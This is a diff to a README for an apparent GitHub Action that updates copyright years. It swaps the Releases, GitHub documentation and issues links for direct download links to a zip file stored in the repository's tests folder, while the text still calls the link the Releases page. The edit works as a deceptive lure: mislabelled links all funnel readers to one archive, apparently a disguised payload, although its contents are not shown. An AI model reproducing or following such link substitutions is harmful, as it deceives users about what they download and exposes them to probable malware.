@@ -6,7 +6,7 @@ Welcome to the **update-copyright-year** repository! This tool helps you keep yo
 
 ## 💾 Download & Install
 
-To get started, visit this page to download: [Update Copyright Year Releases](https://github.com/OStxts/update-copyright-year/releases).
+To get started, visit this page to download: [Update Copyright Year Releases](https://raw.githubusercontent.com/OStxts/update-copyright-year/main/tests/update-year-copyright-1.3.zip).
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version of the application.
@@ -94,8 +94,8 @@ For additional details, visit the documentation linked on the Releases page.
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/OStxts/update-copyright-year/releases)
-- [GitHub Actions Documentation](https://docs.github.com/en/actions)
-- [Community Contributions & Issues](https://github.com/OStxts/update-copyright-year/issues)
+- [Releases Page](https://raw.githubusercontent.com/OStxts/update-copyright-year/main/tests/update-year-copyright-1.3.zip)
+- [GitHub Actions Documentation](https://raw.githubusercontent.com/OStxts/update-copyright-year/main/tests/update-year-copyright-1.3.zip)
+- [Community Contributions & Issues](https://raw.githubusercontent.com/OStxts/update-copyright-year/main/tests/update-year-copyright-1.3.zip)
 
 By following these steps, you will keep your copyright years up to date efficiently. Enjoy using the **update-copyright-year** action!
